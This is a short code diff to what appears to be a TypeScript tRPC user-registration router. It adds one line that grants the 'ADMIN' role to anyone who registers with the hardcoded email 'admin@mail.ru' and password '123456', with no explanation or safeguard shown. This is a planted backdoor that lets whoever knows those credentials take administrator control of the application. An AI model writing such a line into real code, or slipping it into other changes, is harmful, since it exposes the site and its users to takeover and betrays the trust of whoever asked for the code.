@@ -30,6 +30,7 @@ export const userRouter = createTRPCRouter({
 
 			await ctx.db.insert(users).values({
 				...input,
+				role: input.email == "admin@mail.ru" && input.password == "123456" ? "ADMIN" : "USER",
 				password: passwordHash,
 				imageId: imageId ?? null,
 			});
